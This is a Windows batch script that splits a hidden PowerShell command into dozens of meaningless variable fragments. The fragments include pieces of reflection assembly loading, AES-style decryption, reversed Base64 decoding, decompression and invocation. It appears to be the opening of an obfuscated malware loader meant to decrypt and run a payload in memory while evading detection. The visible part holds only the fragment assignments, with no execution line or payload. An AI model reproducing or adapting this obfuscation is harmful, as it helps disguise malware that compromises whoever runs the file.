@echo off
set "cYrWyBvKqx=ptor"
set "MCXsDNaHej=0O+g"
set "VEVevMuYcE=[-1."
set "LXvhCIpiGO=('%*'"
set "DQjCVTQMJF=oin "
set "nTEYzqLkZm=qyod"
set "qBQZAcGmBF='gni"
set "DQguVVxbeR=ay()"
set "LCibuuMSji=yste"
set "UJmCuqyPEN=A.Pa"
set "XWakwPdCVt=($Hz"
set "WQYZIFJyir=;$qy"
set "TCyiZqsMvi=[Sys"
set "HFTRgmgHkY=  $S"
set "YiiWMNlhgD=yTo("
set "iunVDDasUJ= [st"
set "tRqawUluVV=[IO."
set "YzeDYqzuFG=.IO."
set "nFPdNzlyGM=Flzx"
set "iKsHVLqSZN=.Com"
set "PgXiRrGNZu=hy.A"
set "abgOcEKbJj=vert"
set "kyKzOWJqdb= = $"
set "LywlpAWrpj=le  "
set "BUDoHMbPGL=stem"
set "JqcKgGRFIW=esaB"
set "VdbpeZKUDo=Star"
set "dzjXhCWDBA=.Mod"
set "LkXPanFflG= if "
set "LodjJYLpGG=pres"
set "EIIFcvRokQ=V = "
set "ryYkgNtnao=;$UB"
set "szaWhTFwec=ecry"
set "hXzDLkVBcc=oL'["
set "LZNnyEPAjK=Obje"
set "QywcDosmch=)($F"
set "siGuxoUmUD=QNus"
set "pSKMaXSfUh= New"
set "aYtSFRVfzI=1..-"
set "udiVnHhwxs=comm"
set "OfClvNinCb=M = "
set "ckbtIikSNw=o) {"
set "DmBkQPglZi=rity"
set "zIMnZpEZaf=Invo"
set "wLVLoipxcX=Sa ="
set "JgMTbdtpWn=ods "
set "JGfUbBJGoQ=ose("
set "xBRkNEBvRR=S46e"
set "WeKCODxsyH=embl"
set "QkwlpaMulo=Flzx"
set "wxSVUwMNsW===')"
set "ARfMJuFBxU= '')"
set "ZOuCzkjXYJ=stem"
set "DMGAVMqyFl=$zUB"
set "AmILdNNhgK=eam("
set "ArsgweLAkE= '')"
set "eMFuJAVtrx=s.En"
